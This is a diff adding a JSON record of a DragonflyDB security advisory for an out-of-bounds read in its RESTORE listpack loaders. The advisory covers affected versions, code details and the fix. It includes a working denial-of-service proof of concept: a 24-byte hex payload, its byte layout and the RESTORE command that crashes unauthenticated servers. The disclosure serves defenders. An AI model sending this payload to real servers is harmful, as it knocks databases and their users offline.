@@ -1,0 +1,48 @@
+{
+  "global": null,
+  "id": "GHSA-cwjr-j869-h8q9",
+  "repo": {
+    "cve_id": "CVE-2026-54341",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": null,
+        "vector_string": null
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [],
+    "description": "### Summary\r\n\r\nA crafted `RESTORE` payload triggers an out-of-bounds read in DragonflyDB's listpack collection loaders, crashing the entire server process (`SIGSEGV`). Because DragonflyDB requires no authentication by default and `RESTORE` is a normal keyspace command, an **unauthenticated remote attacker can crash the server with a single ~24-byte command** - a remote, repeatable denial of service. There is no operator-side mitigation (no `sanitize-dump-payload` option).\r\n\r\n- **Type:** CWE-125 Out-of-Bounds Read\r\n- **Severity:** High - CVSS:3.1 **7.5** (`AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`)\r\n\r\n### Affected versions\r\n\r\n- **Affected:** `<= df-v1.38.1` (confirmed on the official `ghcr.io/dragonflydb/dragonfly:latest` = `df-v1.38.1`)\r\n- **Patched:** **`df-v1.39.0`** - fixed by [dragonflydb/dragonfly#7502](https://github.com/dragonflydb/dragonfly/pull/7502) (merged 2026-06-03, milestone v1.39)\r\n\r\n### Details\r\n\r\nWhen loading a listpack-encoded collection (`SET`/`HASH`/`ZSET`/`LIST`/`STREAM`), the `RESTORE` loaders validated the attacker-supplied payload with only a **shallow** check - `lpValidateIntegrity(..., deep=0, ...)`. That check verifies the listpack header (declared total bytes + trailing `0xFF` terminator) but **does not validate any interior entry**.\r\n\r\nThe loader then iterates the listpack with `lpFirst`/`lpNext`/`lpGet` and trusts the per-entry length field from the (untrusted) data:\r\n\r\n```cpp\r\n// src/core/detail/listpack_wrap.cc\r\nstd::string_view ListpackWrap::GetView(uint8_t* lp_it, uint8_t int_buf[]) {\r\n  int64_t ele_len = 0;\r\n  uint8_t* elem = lpGet(lp_it, &ele_len, int_buf);\r\n  return std::string_view{reinterpret_cast<char*>(elem), size_t(ele_len)}; // attacker-controlled length\r\n}\r\n```\r\n\r\nA 32-bit-string entry (`0xF0`) with a declared length of `0x7fffffff` but no backing data yields a `string_view` far larger than the buffer. `set->Add(elem)` then hashes/copies those bytes → out-of-bounds read → crash. The only guard, `lpAssertValidEntry` = `assert(lpValidateNext(...))`, is **compiled out under `-DNDEBUG`** (the release/Docker build).\r\n\r\nSame shallow pattern affects every listpack-backed loader:\r\n\r\n| RDB type | Call site |\r\n|---|---|\r\n| `SET_LISTPACK` | `set_family.cc` (`BuildSetFromLP`) |\r\n| `HASH_LISTPACK` | `hset_family.cc` |\r\n| `ZSET_LISTPACK` | `zset_family.cc` |\r\n| `LIST_QUICKLIST_2` | `rdb_load.cc` |\r\n| `SET_INTSET` | `set_family.cc` (`intsetValidateIntegrity(...,0)`) |\r\n\r\nThe **replication** path reaches the same loaders with `ignore_crc=true`, so a malicious master can crash replicas.\r\n\r\n### PoC\r\n\r\n24-byte `RESTORE` payload encoding a `SET_LISTPACK` with one 32-bit-string entry of declared length `0x7fffffff` and no data:\r\n\r\n```\r\npayload (hex): 140c0c0000000100f0ffffff7fff0b00df3452e8ed1ffe61\r\n```\r\n\r\n| Bytes | Meaning |\r\n|---|---|\r\n| `14` | RDB type `SET_LISTPACK` (20) |\r\n| `0c` | RDB string length = 12-byte listpack |\r\n| `0c 00 00 00` | listpack total-bytes = 12 (passes `deep=0` header check) |\r\n| `01 00` | 1 element |\r\n| `f0` | 32-bit string entry |\r\n| `ff ff ff 7f` | entry length = `0x7fffffff` (attacker-controlled) |\r\n| `ff` | `LP_EOF` terminator (passes `deep=0` terminator check) |\r\n| `0b 00` | RDB version 11 |\r\n| `df 34 52 e8 …` | CRC64 footer (attacker-computed; not a security control) |\r\n\r\nSend a single unauthenticated command against a default-config server:\r\n\r\n```\r\nRESTORE pwn 0 <payload>\r\n```\r\n\r\nThe server crashes. Observed crash stack (release image `df-v1.38.1`):\r\n\r\n```\r\n*** SIGSEGV received ***\r\n  XXH3_hashLong_64b_withSeed       <- hashing the out-of-bounds member\r\n  dfly::StringSet::Add()           <- set->Add(elem) reads OOB\r\n  dfly::SetFamily::LoadLPSetBlob() <- deep=0 loader\r\n  dfly::RdbLoaderBase::OpaqueObjLoader::HandleBlob()\r\n  dfly::OpRestore()                <- the RESTORE command\r\n\r\ncontainer state: Exited (139)  ExitCode=139  OOMKilled=false\r\n```\r\n\r\nExit 139 = 128 + 11 (`SIGSEGV`); `OOMKilled=false` confirms a genuine memory fault, not memory exhaustion. Independently reproduced under AddressSanitizer against DragonflyDB's vendored `src/redis/listpack.c` built `-DNDEBUG`, yielding a `heap-buffer-overflow READ`.\r\n\r\n### Impact\r\n\r\nRemote, **unauthenticated**, repeatable **denial of service**: one ~24-byte command crashes the whole multi-threaded process, taking down all shards, keys, and connections. Trivially scriptable, no privileges required in the default configuration, and no operator-side mitigation exists. A malicious replication master can crash all replicas via the same loaders. The same primitive (copying OOB bytes into a real collection member retrievable via `SMEMBERS`/`HGETALL`) plausibly escalates to heap-memory disclosure, though only the DoS is proven deterministically.\r\n\r\n### Fix\r\n\r\nPatched in [dragonflydb/dragonfly#7502](https://github.com/dragonflydb/dragonfly/pull/7502): a `LoadConfig::deep_integrity` flag (enabled only for `RESTORE`) threads deep per-entry validation through the SET/HASH/ZSET/LIST/STREAM listpack loaders and routes intset loading through the same check; malformed payloads now return `ERR Bad data format` instead of crashing. **Upgrade to `df-v1.39.0` or later.**",
+    "ghsa_id": "GHSA-cwjr-j869-h8q9",
+    "html_url": "https://github.com/dragonflydb/dragonfly/security/advisories/GHSA-cwjr-j869-h8q9",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-cwjr-j869-h8q9"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-54341"
+      }
+    ],
+    "published_at": "2026-06-15T15:55:30Z",
+    "references": [],
+    "severity": "medium",
+    "summary": "RESTORE operations may crash the server",
+    "updated_at": "2026-06-15T15:55:30Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "",
+          "name": ""
+        },
+        "patched_versions": "",
+        "vulnerable_version_range": "< 1.39"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "dragonflydb/dragonfly"
+}
